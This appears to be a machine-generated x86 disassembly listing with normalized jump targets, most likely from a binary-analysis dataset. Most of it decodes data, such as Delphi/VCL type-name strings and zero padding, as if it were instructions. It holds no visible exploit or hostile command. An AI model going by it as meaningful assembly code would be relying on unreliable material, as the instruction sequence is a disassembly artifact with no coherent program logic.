add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add ah bl
cmp eax 0x3e100044
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add ah bl
cmp eax 0x3e100044
cmp eax 0x34b40044
inc eax
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x14 ] si
adc eax 0x16070044
push esp
inc edx
popad
jae r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
cmp al 0x44
add al cl
cmp al 0x44
add ah cl
cmp eax [ eax + eax + 0x30 ]
cmp eax [ eax + eax - 0x70 ]
cmp eax [ eax + eax - 0x1c ]
xor al [ eax ]
pushad
xor al [ eax ]
mov [ ebx ] bh
inc esp
add ah cl
outsd
insd
inc esp
add [ eax + 0x50004034 ] ah
cmp eax 0x40680044
inc esp
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add ah bl
inc esp
add ah bl
cmp eax 0x40540044
inc esp
add al cl
cmp al 0x44
add ah cl
cmp eax [ eax + eax + 0xc ]
aas
inc esp
add [ eax - 0x1bffbbc5 ] dl
cmp al 0x44
add al ch
cmp al 0x44
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 8 + 0x17 ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 4 + 0x17 ] si
inc esp
add al ch
adc eax 0x44
or [ ebx + 0x6f ] al
outsb
je r-xdata
cmp al 0x44
add al ch
cmp al 0x44
add al dh
cmp al 0x44
add [ eax + 0x3f ] ch
inc esp
add [ eax + 0x3e ] bh
inc esp
add [ eax + 0x2c00443f ] dh
inc eax
inc esp
add [ eax + 0x40 ] al
inc esp
add [ eax + 0x40 ] ah
inc esp
add [ edi ] cl
push esp
inc esp
jb r-xdata
add al cl
cmp al 0x44
add ah cl
cmp eax [ eax + eax + 0xc ]
aas
inc esp
add [ eax - 0x1bffbbc5 ] dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
test [ edi ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
pop ss
inc esp
add [ eax ] dh
add [ eax ] al
pop eax
adc eax 0x34a00044
inc eax
add [ eax + 0x3d ] dl
inc esp
add [ eax + 0x3d ] al
inc esp
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add ah bl
inc esp
add ah bl
cmp eax 0x40540044
inc esp
inc eax
add [ eax ] cl
test al 0x34
inc esp
jb r-xdata
add al ch
cmp al 0x44
add al dh
cmp al 0x44
add [ ebx ] cl
push esp
inc esp
jb r-xdata
in al 0x3c
inc esp
je r-xdata
inc ecx
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx * 2 + 0x42 ] bh
add [ eax + 0x4c ] ch
inc edx
add [ edx + edx * 2 + 0x44 ] ah
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
in al 0x18
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sbb [ eax + eax ] eax
add al dh
cmp al 0x44
add [ eax + 0x3f ] ch
inc esp
add [ eax + 0x3e ] bh
inc esp
add [ eax + 0x2c00443f ] dh
inc eax
inc esp
add [ eax + 0x40 ] al
inc esp
add [ eax + 0x40 ] ah
inc esp
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax + 0x8004034 ] ch
inc ebx
outsd
outsb
je r-xdata
cmp al 0x44
inc esp
add ah ah
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
xor al 0x40
add [ eax ] cl
outsd
insb
add [ ebx + 0x441848c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x700044 ] al
add [ eax ] al
cmp [ edi ] dl
inc esp
add [ eax ] ch
inc esp
add ah cl
cmp eax [ eax + eax - 0x7c ]
cmp eax 0x3b900044
inc esp
add [ esi + edi ] dh
inc esp
add al ch
cmp al 0x44
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x15 ] si
inc esp
add [ eax ] dh
adc eax 0x44
or [ ebx + 0x6f ] al
outsb
je r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x441a1890
add [ ebx ] al
or al 0x54
xor al [ eax ]
and al 0x32
inc eax
add al cl
adc [ edx ] al
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
jae r-xdata
add [ esi + edi + 0x44 ] dl
add [ eax + 0x6000443d ] dh
cmp eax 0x54120044
inc esp
jb r-xdata
inc esp
outsd
insb
jae r-xdata
add ah bl
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sbb [ eax + eax + 0x64 ] al
add [ eax ] al
add [ eax + 0x26 ] al
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] bh
push edx
inc esp
add [ eax ] dh
mov [ ecx ] es
cmp [ ecx + eax * 2 + 0x418b4c00 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] bl
inc esp
add [ eax ] al
adc [ ecx ] bl
inc esp
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x16680040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + ebx + 0x8060044 ] al
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc edx
add al cl
push esi
inc esp
add [ eax ] dh
adc [ edx ] eax
je r-xdata
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
push ebx
inc esp
add [ eax ] edi
sbb eax [ eax + eax - 0x70 ]
cwde
sbb eax [ eax + eax + 0x1 ]
andps xmm0 [ ebx + 0x6f ]
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb00441a ] dl
jae r-xdata
adc al 0x1b
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ebx ] dl
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
push edi
inc esp
add al bh
inc ebp
add ah bh
inc ebp
add [ edi + edx * 2 + 0x44 ] dl
add ah al
push esp
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x14004210 ] al
adc [ edx ] eax
push 0xb4004211
push ebp
inc esp
add [ eax ] ah
inc ebp
inc esp
test al 0x54
inc esp
add ah bh
adc [ edx ] al
enter 0x4456 0x0
xor [ ecx ] dl
inc edx
add [ edi + edx * 2 + 0x44 ] dh
enter 0x4210 0x0
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
sbb al [ eax + eax + 0x6 ]
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rcl [ edx + ebx + 0xa030044 ] 0x54
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc ebx
popad
outsb
jbe r-xdata
sbb [ eax + eax - 0x54 ] al
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
or [ esp + eax * 2 ] dl
add [ eax ] eax
add [ eax ] al
add al [ eax ]
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
js r-xdata
or [ esp + eax * 2 ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] bh
mov [ ecx ] es
dec esp
mov eax [ ecx ]
xchg esp eax
push esp
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc eax
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add [ eax ] ch
push esi
inc esp
add [ eax + 0x2e ] cl
inc ebp
add [ esi + ebp + 0x45 ] bl
add [ eax + 0x5c004457 ] ah
push esi
inc esp
add [ eax - 0x53ffbad2 ] bl
inc ebp
add [ esi + edx * 2 + 0x2ed40044 ] dl
inc ebp
add al dh
push esi
inc esp
add ah bl
inc ebp
add [ eax ] dl
push edi
inc esp
add ah ah
inc ebp
add [ eax + ebx * 2 ] ah
inc esp
add [ eax + ebx * 2 ] al
inc esp
add [ eax + ebx * 2 + 0x44 ] al
add [ eax ] dh
inc edx
add [ ebp + edx * 2 + 0x2e200044 ] dh
inc ebp
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
xchg esp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x441b9474
jb r-xdata
popad
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] ah
mov eax [ ecx ]
rcl [ ebx + 0x44 ] 0x0
cmp [ ecx + eax * 2 + 0x418b4c00 ] cl
add [ esp + edx * 2 + 0x53840044 ] dl
inc esp
add [ eax ] dl
push esp
mov ah 0x34
inc eax
outsd
insb
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
or esp [ ebx + esi * 2 + 0x44 ]
sbb al [ eax + eax + 0x3 ]
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x19840040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al [ eax + eax + 0x1c ]
add [ eax ] al
add [ eax ] bh
daa
inc ebp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
xchg esp eax
sbb eax [ eax + eax + 0x8 ]
or edx [ ebp + ecx * 2 + 0x6f ]
sbb eax [ eax + eax + 0x14 ]
add [ eax ] al
dec [ eax ]
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
call 0x8446105
sbb eax [ eax + eax + 0x10 ]
add [ eax ] al
dec [ eax ]
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
imul ebp [ esi + 0x74 ] 0x441c0073
add [ edi + ebx * 2 + 0x41 ] bl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
sub al 0x1c
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x1b3cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
loopne r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
add bh bh
or [ esp + eax * 2 ] dl
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xe800408d
sbb al 0x44
add [ eax ] cl
imul esp [ edi + 0x68 ] 0x441b9474
imul esp [ gs : edi + 0x68 ] 0x441b9474
add [ eax + eax ] cl
add bh bh
inc esp
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
inc esp
add [ ebx + edx * 2 + 0x54100044 ] al
add eax 0x0
outsb
jae r-xdata
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
imul ebp [ esi + 0x64 ] 0x1
inc esp
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
cmp al 0x1b
or [ ebx + 0x6f ] al
outsb
je r-xdata
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
push es
add [ ecx ] al
add [ eax ] al
inc esp
add [ ebx ] al
add [ ecx + edx ] ch
inc eax
add [ eax - 0x2fffbff0 ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] al
dec [ eax ]
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
add [ eax ] cl
js r-xdata
add [ ebx + ebx + 0x80044 ] dl
add bh bh
or [ esp + eax * 2 ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ eax ] bh
sbb eax [ eax + eax + 0x6 ]
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ ecx + edx ] ch
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push edi
inc ecx
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add al dl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + ebx + 0x44 ] dl
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add al ah
sbb al [ eax + eax + 0x3 ]
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x441a ] dl
sub al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
xor al 0x1f
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
adc [ eax ] al
nop
aam 0x1e
inc esp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
nop
sbb al [ eax + eax ]
outsb
je r-xdata
sub al 0x11
inc eax
add al dl
push edi
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x1dc40040 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
sub al 0x11
inc eax
add [ eax ] dh
adc eax 0x1f7c0044
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
fcomp [ edi ]
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x2c ] si
adc [ eax ] eax
xor [ 0x1f7c0044 ] dl
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] ch
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
dec esp
push ds
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x2c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x1e4c0040 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
sub al 0x11
inc eax
add al dl
pop ss
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x20400040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
sub al 0x11
inc eax
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add al bl
pop ds
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x441d60c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
sub al 0x11
inc eax
add [ edx + ebx ] dl
inc esp
add al dl
push edi
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
sub al 0x11
inc eax
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x1f340040 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] ch
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al dl
pop ss
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x441a ] dl
adc [ eax ] al
nop
shl [ eax ] 0x1
inc esp
add [ eax ] cl
or al 0x54
sub al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
adc al 0x22
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
sub [ edi ] ah
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x2c ] si
adc [ eax ] eax
rcl [ edi ] 0x1
inc esp
add [ eax + 0x8004421 ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x44239cc0 ] cl
add [ eax ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] ch
daa
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] ch
inc eax
add [ eax ] ch
daa
inc esp
add [ eax ] al
das
inc esp
add [ eax ] al
adc [ eax ] al
cmp al 0x21
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
push ss
push esp
